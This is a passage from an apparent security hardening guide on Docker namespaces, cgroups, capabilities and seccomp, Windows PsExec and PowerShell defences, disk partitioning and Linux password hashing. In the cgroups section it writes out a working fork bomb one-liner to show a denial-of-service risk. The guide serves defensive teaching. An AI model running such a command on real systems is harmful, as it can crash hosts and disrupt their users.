    The first process that is created in a new `PID` namespace is the "init" process with `PID` 1, which assumes parenthood of the other processes within the same `PID` namespace. When `PID` 1 is terminated, so are the rest of the processes within the same `PID` namespace.
    
    `PID` namespaces are [hierarchically nested](https://lwn.net/Articles/531419/) in ancestor-descendant relationships to a depth of up to 32 levels. All `PID` namespaces have a parent namespace, other than the initial root `PID` namespace of the host system. That parent namespace is the `PID` namespace of the process that created the child namespace.
    
    Within a `PID` namespace, it is possible to access (make system calls to specific `PID`s) all other processes in the same namespace, as well as all processes of descendant namespaces. However, processes in a child `PID` namespace cannot see processes that exist in the parent `PID` namespace or further removed ancestor namespaces. The direction any process can access another process in an ancestor/descendant `PID` namespace is one way.
    
    Processes in different `PID` namespaces can have the same `PID`, because the `PID` namespace isolates the `PID` number space from other `PID` namespaces.
    
    Docker takes advantage of `PID` namespaces. Just as you would expect, a Docker container can not access the host system processes. It processes Ids that are used in the host system that can be reused in the container, including `PID` 1, by being reassigned to a process started within the container. The host system can however access all processes within its containers, because as stated above, `PID` namespaces are hierarchically nested in parent-child relationships. Processes in the hosts `PID` namespace can access all processes in their own namespace down to the `PID` namespace that was responsible for starting the process, such as the process within the container in our case.
    
    The default behaviour can however be overridden to allow a container to be able to access processes within a sibling container, or the hosts `PID` namespace. [Example](https://docs.docker.com/engine/reference/run/#pid-settings-pid):
    
    {title="Syntax", linenos=off, lang=bash}
        --pid=[container:<name|id>],[host]
    
    {title="Example", linenos=off, lang=bash}
        # Provides access to the `PID` namespace of container called myContainer
        # for container created from myImage.
        docker run --pid=container:myContainer myImage
    
    {title="Example", linenos=off, lang=bash}
        # Provides access to the host `PID` namespace for container created from myImage
        docker run --pid=host myImage
    
    As an aside, `PID` namespaces give us the [functionality of](http://man7.org/linux/man-pages/man7/pid_namespaces.7.html): "_suspending/resuming the set of processes in the container and migrating the container to a new host while the processes inside the container maintain the same PIDs._" with a [handful of commands](https://www.fir3net.com/Containers/Docker/the-essential-guide-in-transporting-your-docker-containers.html):
    
    {title="Example", linenos=off, lang=bash}
        docker container pause myContainer [mySecondContainer...]
        docker export [options] myContainer
        # Move your container to another host.
        docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]
        docker container unpause myContainer [mySecondContainer...]
    
3. `net`: (Networking) Provides network isolation by managing the network stack and interfaces. It is also essential to allow containers to communicate with the host system and other containers. Network namespaces were introduced into the kernel in 2.6.24, January 2008, with an additional year of development they were considered largely done. The only real concern here is understanding the Docker network modes and communication between containers. This is discussed in the Countermeasures.  
      
4. `UTS`: (Unix Timesharing System) Provides isolation of kernel and version identifiers.  
    
    UTS is the sharing of a computing resource with many users, a concept introduced in the 1960s/1970s.
    
    A UTS namespace is the set of identifiers [returned by `uname`](http://man7.org/linux/man-pages/man2/clone.2.html), which include the hostname and the [NIS](#vps-identify-risks-unnecessary-and-vulnerable-services-nis) domain name. Any processes which are not children of the process that requested the clone will not be able to see any changes made to the identifiers of the UTS namespace.
    
    If the `CLONE_NEWUTS` constant is set, then the process being created will be created in a new UTS namespace with the hostname and NIS domain name copied and able to be modified independently from the UTS namespace of the calling process.
    
    If the `CLONE_NEWUTS` constant is not set, then the process being created will be created in the same UTS namespace of the calling process, thus able to change the identifiers returned by `uname`.
    
    When a container is created, a UTS namespace is copied ([`CLONE_NEWUTS` is set](https://github.com/docker/libcontainer/blob/83a102cc68a09d890cce3b6c2e5c14c49e6373a0/SPEC.md))(`--uts=""`) by default, providing a UTS namespace that can be modified independently from the target UTS namespece it was copied from.
    
    When a container is created with [`--uts="host"`](https://docs.docker.com/engine/reference/run/#uts-settings-uts), a UTS namespace is inherited from the host, the `--hostname` flag is invalid.  
    
5. `IPC`: (InterProcess Communication) manages access to InterProcess Communications. `IPC` namespaces isolate your container's System V IPC and POSIX message queues, semaphores, and named shared memory from those of the host and other containers, unless another container specifies on run that it wants to share your namespace. It would be a lot safer if the producer could specify which consuming containers could use its [namespace](http://man7.org/linux/man-pages/man7/namespaces.7.html). IPC namespaces do not include IPC mechanisms that use filesystem resources such as named pipes.
    
    According to the [namespaces man page](http://man7.org/linux/man-pages/man7/namespaces.7.html): "_Objects created in an IPC namespace are visible to all other processes that are members of that namespace, but are not visible to processes in other IPC namespaces._"
    
    Although sharing memory segments between processes provide Inter-Process Communications at memory speed, rather than through pipes or worse, the network stack, this produces a significant security concern.
    
    By default a container does not share the host's or any other container's IPC namespace. This behaviour can be overridden to allow a (any) container to reuse another container's or the host's message queues, semaphores, and shared memory via their IPC namespace. [Example](https://docs.docker.com/engine/reference/run/#ipc-settings-ipc):
    
    {title="Syntax", linenos=off, lang=bash}
        # Allows a container to reuse another container's IPC namespace.
        --ipc=[container:<name|id>],[host]
    
    {title="Example", linenos=off, lang=bash}
        docker run -it --rm --name=container-producer ubuntu
        root@609d19340303:/#
        
        # Allows the container named container-consumer to share the IPC namespace
        # of container called container-producer.
        docker run -it --rm --name=container-consumer --ipc=container:container-producer ubuntu
        root@d68ecd6ce69b:/#
    
    Now find the Ids of the two running containers:  
    
    {title="Query", linenos=off, lang=bash}
        docker inspect --format="{{ .Id }}" container-producer container-consumer
    
    {title="Result", linenos=off, lang=bash}
        609d193403032a49481099b1fc53037fb5352ae148c58c362ab0a020f473c040
        d68ecd6ce69b89253f7ab14de23c9335acaca64d210280590731ce1fcf7a7556
    
    You can see from using the command supplied by the [CIS_Docker_1.13.0_Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf) that `container-consumer` is using the IPC namespace of `container-producer`:
    
    {title="Query", linenos=off, lang=bash}
        docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: IpcMode={{ .HostConfig.IpcMode }}'
    
    {title="Result", linenos=off, lang=bash}
        d68ecd6ce69b89253f7ab14de23c9335acaca64d210280590731ce1fcf7a7556: IpcMode=container:container-producer
        609d193403032a49481099b1fc53037fb5352ae148c58c362ab0a020f473c040: IpcMode=
    
    When the last process in an IPC namespace terminates, the namespace will be destroyed along with all IPC objects in the namespace.  
    
6. `user`: Not enabled by default. Allows a process within a container to have a unique range of user and group Ids within the container, known as the subordinate user and group Id feature in the Linux kernel. These do not map to the same user and group Ids of the host, container users to host users are remapped. For example, if a user within a container is root, which it is by default unless a specific user is defined in the image hierarchy, it will be mapped to a non-privileged user on the host system.  
Docker considers user namespaces to be an advanced feature. There are currently some Docker features that are [incompatible](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-user-namespace-options) with using user namespaces, and according to the [CIS Docker 1.13.0 Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf), functionalities that are broken if user namespaces are used. the [Docker engine reference](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-user-namespace-options) provides additional details around known restrictions of user namespaces.  
If your containers have a predefined non-root user, then, currently, user namespaces should not be enabled, due to possible unpredictable issues and complexities, according to "2.8 Enable user namespace support" of the [CIS Docker Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf).  
The problem is that these mappings are performed on the Docker daemon rather than at a per-container level, so it is an all or nothing approach. This may change in the future though.  
As mentioned, user namespace support is available, but not enabled by default in the Docker daemon.

##### Control Groups

When a container is started with `docker run` without specifying a cgroup parent, as well as creating the namespaces as discussed above, Docker also creates a Control Group (or cgroup) with a set of system resource hierarchies, nested under the default parent `docker` cgroup, also created at container runtime, if not already present. You can see how this hierarchy looks in the `/sys/fs/cgroup` pseudo-filesystem in the [Countermeasures](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup) section. Cgroups have been available in the Linux kernel since [January 2008 (2.6.24)](https://kernelnewbies.org/Linux_2_6_24#head-5b7511c1e918963d347abc8ed4b75215877d3aa3), and continue to improve. Cgroups track, provide the ability to monitor, and configure, fine-grained limitations on how much of any resource a set of processes, or in the case of Docker or pure LXC, any given container can use, such as CPU, memory, disk I/O, and network. Many aspects of these resources can be controlled, but by default, any given container can use all of the system's resources, allowing potential DoS.

**Fork Bomb from Container**

If an attacker gains access to a container, or, in a multi-tenanted scenario where being able to run a container by an arbitrary entity is expected, by default, there is nothing stopping a fork bomb  
`:(){:|:&};:`  
launched in a container from bringing the host system down. This is because, by default, there is no limit to the number of processes a container can run.

##### Capabilities

According to the Linux [man page for capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html), "_Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled_". This is on a per thread basis. Root, with all capabilities, has privileges to do everything. According to the man page, there are currently 38 capabilities.

By default, the following capabilities are available to the default user of root within a container, check the man page for the full descriptions of the capabilities. Dan Walsh is very knowledgeable and one of the experts when it comes to applying least privilege to containers, he also [discusses these](http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/): `chown`, `dac_override`, `fowner`, `fsetid`, `kill`, `setgid`, `setuid`, `setpcap`, `net_bind_service`, `net_raw`, `sys_chroot`, `mknod`, `audit_write`, `setfcap`. `net_bind_service` for example it allows the superuser to bind a socket to a privileged port <1024 if enabled. The Open Container Initiative (OCI) [runC specification](https://github.com/opencontainers/runc/tree/6c22e77604689db8725fa866f0f2ec0b3e8c3a07#running-containers) is considerably more restrictive, only enabling three capabilities: `audit_write`, `kill`, `net_bind_service`

As stated on the Docker Engine [security page](https://docs.docker.com/engine/security/security/): "_One primary risk with running Docker containers is that the default set of capabilities and mounts given to a container may provide incomplete isolation, either independently, or when used in combination with kernel vulnerabilities._"

##### Linux Security Modules (LSM) {#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules}

Here is a little history to start with: In the early 1990s, Linux was developed as a clone of the Unix Operating system. The core Unix security model, which is a form of [Discretionary Access Control](https://en.wikipedia.org/wiki/Discretionary_access_control) (DAC), was inherited by Linux. I have provided a glimpse of some of the Linux kernel security features that have been developed since the inception of Linux. The Unix DAC remains at the core of Linux. The Unix DAC allows a subject and/or the group of an identity to set the security policy for a specific object. The canonical example is a file, and having a user set the different permissions on who can do what with it. The Unix DAC was [designed in 1969](https://www.linux.com/learn/overview-linux-kernel-security-features), and a lot has changed since then.
 
Capabilities vary in granularity, therefore attain an understanding of both capabilities and Linux Security Modules (LSMs). Many of the DACs can be circumvented by users. Finer grained control is often required along with Mandatory Access Control (MAC).

##### SecComp {#vps-identify-risks-docker-docker-engine-and-containers-seccomp}

Secure Computing Mode (SecComp) is a security facility that reduces the attack surface of the Linux kernel by reducing the number of System calls that can be made by a process. Any System calls made by the process, outside of the defined set, will cause the kernel to terminate the process with `SIGKILL`. In doing so, the SecComp facility stops a process from accessing the kernel APIs via System calls.

The first version of SecComp was merged into the Linux kernel mainline in [version 2.6.12 (March 8 2005)](https://git.kernel.org/cgit/linux/kernel/git/tglx/history.git/commit/?id=d949d0ec9c601f2b148bed3cdb5f87c052968554). If enabled for a given process, only four System calls could be made: `read()`, `write()`, `exit()`, and `sigreturn()`, thus significantly reducing the kernel's attack surface.

In order to enable SecComp for a given process, [you would write](https://lwn.net/Articles/656307/) a `1` to `/proc/<PID>/seccomp`. This would cause the one-way transition into the restrictive state.

There have been a few revisions since 2005, such as the addition of "seccomp filter mode", which allowed processes to specify which System calls are allowed. There was also the addition of the `seccomp()` System call in 2014 to kernel version 3.17. [Like other popular applications](https://en.wikipedia.org/wiki/Seccomp) such as Chrome/Chromium and OpenSSH, Docker uses SecComp to reduce the attack surface on the kernel APIs.

Docker has [disabled about 44 system calls](https://docs.docker.com/engine/security/seccomp/) in its default (seccomp) container profile ([default.json](https://github.com/docker/docker/blob/master/profiles/seccomp/default.json)) out of well over 300 available in the Linux kernel. Docker calls this "_moderately protective while providing wide application compatibility_". It appears that ease of use is the first priority. Again, plenty of opportunity here for reducing the attack surface on the kernel APIs. For example, the `keyctl` System call was removed from the default Docker container profile after vulnerability [CVE-2016-0728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-0728) was discovered, which allows privilege escalation or denial of service. [CVE-2014-3153](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-3153) is another vulnerability accessible from the `futex` System call which is white listed in the default Docker profile.

If you are looking to attack the Linux kernel via its APIs from a Docker container, you still have plenty of surface area here to play with.

##### Read-only Containers

In order to set up read-only hosts, physical or virtual, there is a lot of work to be done, and in some cases, it becomes challenging to stop an Operating System writing to some files. Recall how much work was involved in [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation) and [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions). In contrast, running Docker containers as read-only is trivial. Check the [Countermeasures](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers) section.

#### Application Security
![](images/ThreatTags/easy-common-easy-moderate.png)

Application security is still our biggest weakness. I cover this in many other places, especially in the [Web Applications](#web-applications) chapter.

### Using Components with Known Vulnerabilities
![](images/ThreatTags/average-widespread-difficult-moderate.png)

This is exactly what your attackers rely on you doing: not upgrading out of date software. This is the same concept as discussed in the Web Applications chapter under "[Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source)". Just do not do it: stay patched!

### Lack of Backup
![](images/ThreatTags/difficult-common-veryeasy-moderate.png)

There is not a lot to say here, other than make sure you do this. I have personally seen so many disasters that could have been avoided if timely / regular backups had been implemented and tested routinely. I have seen many situations where backup schedules were in place, but they had not been tested for a period of time, and when it came time to use them, they were not available for various reasons. When your infrastructure gets owned, don't be the one that can not roll back to a good known state.

### Lack of Firewall {#vps-identify-risks-lack-of-firewall}
![](images/ThreatTags/average-uncommon-veryeasy-moderate.png)

So many rely on firewalls to hide many weak areas of defence. The lack of a firewall does not have to be an issue if your services and communications between them are hardened. In fact, I see it as a goal many of us should have, as it forces us to build better layers of defence.

## 3. SSM Countermeasures {#vps-countermeasures}

* MS Host Threats and Countermeasures:  
[https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* MS Securing Your Web Server: [https://msdn.microsoft.com/en-us/library/ff648653.aspx](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Microsoft specific, but does offer some insight into technology agnostic risks and countermeasures
* MS Securing Your Application Server:  
[https://msdn.microsoft.com/en-us/library/ff648657.aspx](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-countermeasures-forfeit-control-thus-security}
![](images/ThreatTags/PreventionEASY.png)

Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. How easy this will be is determined by how much you already have invested. Cloud offerings are often more expensive in monetary terms for medium to large environments, so as you grow, the cost benefits you may have gained due to quick development up-front will often become an anchor holding you back. Because you may have bought into a cloud or hosting provider's proprietary way of doing things, it now becomes costly to migrate, and your younger competitors, who can turn more quickly, out manoeuvre you. Platform as a Service (PaaS) and [serverless technologies](#cloud-identify-risks-serverless) (as discussed in the Cloud chapter) often appear even more attractive, but everything comes at a cost. Cloud platforms may look good to start with, but often they are too good, and the costs will catch up with you. All that glitters is not gold.

### Windows

#### PsExec and Pass The Hash (PTH) {#vps-countermeasures-psexec-pth}
![](images/ThreatTags/PreventionDIFFICULT.png)

Defence in depth will help here, the attacker should not be in possession of your admin passwords or hashes. If this has already happened, how did it happen? Take the necessary steps to make sure it does not happen again.

Samba is not usually installed on Linux by default, but as we are dealing with Windows here, SMB is installed and running on your machines.

* Port scan your target machines
* Close the SMB related ports 445 TCP, earlier OS's used 137, 138, 139
* Port scan again to verify
* Turn off public folder sharing

Check the list of requirements for PsExec and turn off / disable what you can.

Try and re-exploit with the provided directions in the [Identify Risks](#vps-identify-risks-psexec) section.

Restrict administrative accounts as much as possible, especially network administrator accounts. All users should have the least amount of privilege necessary in order to do their jobs, and elevate only when needed. This is why most Linux distributions use sudo.

Consider multi-factor authentication methods for administrators.

How exposed are administrator's machines? Can they be put on a less exposed network segment? 

In a Windows network, those who are the most likely to be exploited are administrators. Pay special attention to them and their machines. For example, if an attacker uses the `current_user_psexec` module, then once they have access to an administrator's machine, traversal to other machines like Domain Controllers is trivial if the administrator's current login context allows them to access the Domain Controller. Make sure administrators are aware of this, and that they only elevate privileges when it is required, and not on their own machines.

Network Intrusion Detection Systems ([NIDS](#network-countermeasures-lack-of-visibility-nids)) will not be able to detect the actual passing of the administrator's credentials to the target system due to legitimate SysInternals PsExec behaviour, but a NIDS can be configured to watch for what happens when the attackers payload executes. For example, it is not normally legitimate behaviour for reverse shells to be sent over the network. Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)) can, of course, detect the presence of additional and modified files, although these are less commonly run on desktop computers.

#### PowerShell Exploitation with Persistence {#vps-countermeasures-powershell-exploitation-with-persistence}
![](images/ThreatTags/PreventionDIFFICULT.png)

Upgrade PowerShell to the latest version.

As above, **NIDS can help** here. Often these attacks do not leave any files on the disk. Next-generation AV products are slowly coming to the market, such as those that use machine learning. Most of the products I have seen so far are very expensive though, this should change in time.

**Deep Script Block Logging** can be enabled from PowerShell v5 onwards. This option tells PowerShell to record the content of all script blocks that it processes, we rely heavily on script blocks with PowerShell attacks. Script Block Logging includes recording of dynamic code generation and provides insight into all the script-based activity on the system, including scripts that are encoded to evade antimalware, and understanding of observation with human eyes. This applies to any application that hosts PowerShell engine, CLI, or ISE.

[Script Block Logging records](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html) and logs the original obfuscated (XOR, Base64, encryption, etc) script, transcripts, and de-obfuscated code.

Run gpedit.msc -> open Local Group Policy Editor -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn On PowerShell Script Block Logging -> Check the "Enabled box". By default, each script block is only logged the first time it is run. You can also check the "Log script block invocation start / stop events" check box if you want to log start and stop events for every time any script block is invoked. The second option can produce very large amounts of log events though.

This setting may also be accessible from the registry:

Set `EnableScriptBlockLogging = 1`  
at  
`HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`  
or  
`HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`

### Minimise Attack Surface by Installing Only what you Need
![](images/ThreatTags/PreventionVERYEASY.png)

I am hoping that this goes without saying, unless you are setting up a Windows server with "all the stuff", you will have little control over its hardening process. This is why I favour UNIX-based servers. I/You have all the control, if anything goes wrong, otherwise it will usually be our own fault for missing or neglecting something. The less exposure you have on your servers, the fewer servers you have, the smaller the network you have, the fewer employees you have (the less you have of everything), the less there is for an attacker to compromise, and the quicker you can move.

### Disable, Remove Services. Harden what is left {#vps-countermeasures-disable-remove-services-harden-what-is-left}

A lot of the content of this section came from a web server I set-up, from install through to the hardening process.

There are often a few services you can disable, even on a bare bones Debian install, and some that are just easier to remove. When going through the process of hardening what is left, make sure you test before and after each service you disable, remove or harden, watch the port being opened/closed, etc. Remember, the less you have, the less there is to be exploited.

#### Partitioning on OS Installation {#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation}
![](images/ThreatTags/PreventionAVERAGE.png)

By creating many partitions, and applying the least privileges necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to.

This is a similar concept to tightly constraining input fields that are only able to accept structured data (names (alpha only), dates, social security numbers, zip codes, email addresses, etc) rather than leaving input wide open to the entry of any text, as discussed in the Web Applications chapter under [What is Validation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation).

The way I'd usually set-up a web server's partitions is as follows: Delete all the current partitions and add the following. `/` was added to the start and the rest to the end, in the following order: `/`, `/var/log` (optional, but recommended), `/var/tmp` (optional, but recommended), `/var`, `/tmp`, `/opt`, `/usr/share` (optional, but recommended), `/usr`, `/home`, `swap`.

You will notice in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, that I ended up adding additional partitions (as mentioned in the previous paragraph) to apply finer grained control on directories that are often targeted by attackers. It is easier to add those partitions here, we will add options to them in the Lock Down section.

![](images/PartitioningDisk.png)

If you add the "optional, but recommended" partitions, then they may look more like the following after a `df -h`:

{linenos=off, lang=Bash}
    Filesystem      Size  Used Avail Use% Mounted on
    /dev/sda1       4.5G  453M  3.8G  11% /
    /dev/sda8       6.3G  297M  5.7G   5% /usr
    tmpfs           247M     0  247M   0% /dev/shm
    /dev/sda9        18G  134M   17G   1% /home
    /dev/sda7       3.7G  7.5M  3.4G   1% /opt
    /dev/sda6       923M  1.2M  859M   1% /tmp
    /dev/sda13      965M  340M  560M  38% /usr/share
    /dev/sda5       3.4G  995M  2.2G  32% /var
    /dev/sda11       95M  1.6M   87M   2% /var/tmp
    /dev/sda12      186M   39M  134M  23% /var/log

Partition sizes should be set-up according to your needs. If you have plenty of RAM, make your `swap` small, if you have minimal RAM (barely (if) sufficient), you could double the RAM size for your `swap`. It is usually a good idea to think about what mount options you want to use for your specific directories. This may shape how you set up your partitions. For example, you may want to have options `nosuid`,`noexec` on `/var` but you cannot because there are shell scripts in `/var/lib/dpkg/info`, so you could set-up four partitions: `/var` without `nosuid`,`noexec` and `/var/tmp`, `/var/log`, `/var/account` with `nosuid`,`noexec`. Look ahead to the [Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section for more details, or just wait until you get to it.

You can think about changing `/opt` (static data) to mount read-only in the future as another security measure if you like.

#### Apt Proxy Set-up

If you want to:

1. Save on bandwidth
2. Have a large number of your packages delivered at your network speed rather than your internet speed
3. Have several Debian-based machines on your network

I recommend using apt-cacher-ng, installable with an `apt-get`, you will have to set this up on a server, by modifying the `/var/apt-cacher-ng/acng.conf` file to suite your environment. There is ample documentation on this. Then, add the following file to each of your debian based machines.

`/etc/apt/apt.conf` with the following contents and set its permissions to be the same as your sources.list:

{linenos=off, lang=Bash}
    # IP is the address of your apt-cacher server
    # Port is the port that your apt-cacher is listening on, usually 3142
    Acquire::http::Proxy “http://[IP]:[Port]”;

Now, replace the apt proxy references in the `/etc/apt/sources.list` of your consuming servers with the internet mirror you want to use, thus we contain all the proxy related config in one line in one file. This will allow the requests to be proxied and packages cached via the apt cache on your network when requests are made to the mirror of your choosing.

Update the list of packages, then upgrade them with the following command line. If you are using sudo, you will need to add that to each command:

{linenos=off, lang=Bash}
    apt-get update && apt-get upgrade
    # Only run apt-get upgrade if apt-get update is successful (exits with a status of 0).

Now, if you're working through an installation, you'll be asked for a mirror to pull packages from. If you have the above apt caching server set-up on your network, this is a good time to make it work for you. You'll just need to enter the caching servers IP address and port.

A> The steps you take to harden your server(s) that have many user accounts will be considerably different to this. Many of the steps I have gone through here will be insufficient for a server with many users. The hardening process is not a one-time procedure. It ends when you decommission the server. Be prepared to stay on top of your defences. It is much harder to defend against attacks than it is to exploit a vulnerability.

#### Review Password Strategies {#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies}
![](images/ThreatTags/PreventionEASY.png)

You will likely have to follow along on your VPS through this next section in order to understand what I am saying.

Make sure passwords are encrypted with an algorithm that will stand up to the types of attacks and hardware you anticipate that your attackers will use. I have provided additional details around which Key Derivation Functions are best suited to which types of hardware in the "[Which KDF to use](#web-applications-countermeasures-data-store-compromise-which-kdf-to-use)" section within the Web Applications chapter.

In most cases you will [want to](http://www.tldp.org/HOWTO/Shadow-Password-HOWTO-2.html#ss2.2) shadow your passwords. This should be the default in most cases, or in all recent Linux distributions.

How do you know if you already have the Shadow Suite installed? If you have a `/etc/shadow` file, take a look at the file. You should see your user and any others with an encrypted value following it. There will be a reference to the password from the `/etc/passwd` file, stored as a single `X` (discussed below). If the Shadow Suite is not installed, then your passwords are probably stored in the `/etc/passwd` file.

[Crypt](https://en.wikipedia.org/wiki/Crypt_(C)), crypt 3 or crypt(3) is the Unix C library function designed for password authentication. The following table shows which Operating Systems have support out of the box and which have hashing functions or key derivation functions that are supported. We will discuss this table in a moment, so don't worry just yet if you do not understand it all:

&nbsp;

![](images/CryptSupportInOperatingSystems.png)

&nbsp;

It may be worth looking at and modifying the `/etc/shadow` file. Consider changing the “maximum password age” and “password warning period”. Consult the man page for shadow for full details. Check that you are happy with which encryption algorithms are currently being used. The files you will need to look at are: `/etc/shadow` and `/etc/pam.d/common-password`. The man pages you will probably need to read in conjunction with each other are the following:

* shadow
* pam.d
* crypt 3
* pam_unix

{#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-default-number-of-rounds}
Out of the box, crypt (glibc) supports MD5, SHA-256 and SHA-512, I wouldn't bother looking at DES, and MD5 is common but weak. You can also use the blowfish cipher via the bcrypt KDF with a little more work (a few minutes). The default of SHA-512 (in debian) enables salted passwords. The SHA family of hashing functions are too fast for password hashing. Crypt applies key stretching to slow brute-force cracking attempts down. The default number of rounds [have not changed](https://access.redhat.com/articles/1519843) in at least 9 years, so it is well worth modifying the number to keep up with hardware advancements. There are some [details](#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot) to work out what the factor should be, as provided by OWASP in the MembershipReboot section in the Web Applications chapter. The [default number of rounds](https://en.wikipedia.org/wiki/Passwd) are as follows:

* MD5: 1000 rounds
* Blowfish: 64 rounds
* SHA-[256, 512]: 5000 rounds

{#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-owasp-advice}
OWASP advises that we should double the rounds every subsequent two years. So, for the likes of SHA in 2007 having 5000 rounds, we should be looking at increasing this to `160000` in the year 2017, if you are still using the default, you are a long way behind, so it is time to do some serious key stretching.

![](images/KeyStretching.png)

How can you tell which algorithm you are using, salt size, number of iterations for the computed password, etc? The [crypt 3](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) man page explains it all. By default a Debian install will be using SHA-512 which is better than MD5 and the smaller SHA-256. Don't take my word for it though, have a look at the `/etc/shadow` file. I will explain the file format below.

By default, I did not have a “rounds” option in my `/etc/pam.d/common-password` module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and with an attacker not knowing what that number is, it will slow down a brute-force attack.

You can increase the `rounds` by overriding the default in `/etc/pam.d/common-passwowrd`. You override the default by adding the rounds field and the value you want to use, as seen below.

{title="/etc/pam.d/common-passwowrd", linenos=off, lang=Bash}
    password [success=1 default=ignore] pam_unix.so obscure sha512 rounds=[number of rounds]

Next time someone changes their password (providing the account is local), `[number of rounds]` number of `rounds` will be used.

I would suggest adding this and recreating your passwords now. Just before you do, it is usually a good idea to be logged in at an extra terminal and possibly a root terminal as well, until you are sure you can log in again. It just makes things easier if, for what ever reason, you can no longer log in at a new terminal. Now, as your normal user run:

`passwd`

providing your existing password, then your new one twice. You should now be able to see your password in the `/etc/shadow` file with the added `rounds` parameter.

Also, have a check in `/var/log/auth.log`. Reboot and check that you can still log in as your normal user. If all good, do the same with the root account.

Let's have a look at the `passwd` and `shadow` file formats.

`:` is a separator in both `/etc/shadow` and `/etc/passwd` files:

{title="/etc/shadow", linenos=off, lang=Bash}
    you:$id$rounds=<number of rounds, specified in /etc/pam.d/common-password>$[up to 16 character salt]$[computed password]:<rest of string>

1. `you` is the Account username
2. `$id$salt$hashedpassword` is generally considered to be the encrypted password, although this is made up of three base fields separated by the `$`. The `id` can be any of the *Scheme id*s that crypt supports, as shown in the above table. How the rest of the substrings in this field are interpreted is [determined](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) by what is found in the `id` field. The salt can be up to 16 characters. In saying that, the salt can be [augmented](http://backreference.org/2014/04/19/many-ways-to-encrypt-passwords/) by prepending the `rounds=<number of rounds, sourced from /etc/pam.d/common-password>$` directive.

The hashed part of the password string is the actual computed password. The size of this string is fixed as per the below table:

![](images/EncryptedPartOfCryptStringInShadowFile.png)

The rest of the fields are as per below.

{title="/etc/shadow", linenos=off, lang=Bash}    
    daemon:*:15980:0:99999:7:::

1. `daemon` is the account username
2. `*` is the place where the salt and hashed password would go, the asterisk means that this account can not be used to log in.
3. `15980` is the number of days from the Unix "epoch" (1970-1-1) to when the password was changed.
4. `0` is the minimum password age or number of days that the user will have to wait before they will be allowed to change their password. An empty field or `0` means that there is no minimum.
5. `99999` is the maximum number of days until the user will be forced to change their password. `99999` or an empty value means that there is no limit to the maximum age that the password should be changed. If the maximum password age is lower than the minimum password age (No. 4) the user can not change their password.
6. `7` is the password warning period. An empty value of `0` means that there is no warning period.
7. The last three fields are:
    1. Password inactivity period, days before the account is made inactive
    2. Account expiration date, expressed in days since Unix "epoch" (1970-1-1)
    3. Reserved field, not currently used

The format of the `/etc/passwd` file is as follows:

{title="/etc/passwd", linenos=off, lang=Bash}    
    root:x:0:0:root:/root:/bin/bash
    you:x:1000:1000:you,,,:/home/you:/bin/bash

1. `root` and `you` are the account usernames
2. `x` is the placeholder for password information. The password is obtained from the `/etc/shadow` file.
3. `0` or `1000` is the user Id, the root user always has an Id of `0`.
4. The second `0` or `1000` is the primary group Id for the user, the root user always has a primary group Id of `0`.
5. `root` or `you,,,` is the comment field. This field can be used to describe the user or user's function. This could be used for contact details, or perhaps what the account is used for.
6. `/root` or `/home/you` is the users home directory. For regular users, this would usually be `/home/[you]`. For root, this is `/root`.
7. `/bin/bash` is the users default shell.

##### [Consider](https://lists.debian.org/debian-user/2011/04/msg00550.html) changing to Bcrypt

You should find this fairly straight forward on a Debian server in order to [use bcrypt](https://serverfault.com/questions/10585/enable-blowfish-based-hash-support-for-crypt/11685) with slowpoke blowfish, which is the best (very slow) algorithm available for hashing passwords currently. This is obvious by the number of iterations applied by default as noted above, 64 rounds as opposed to `MD5`s 1000 rounds, and `SHA`s 5000 rounds from 2007.

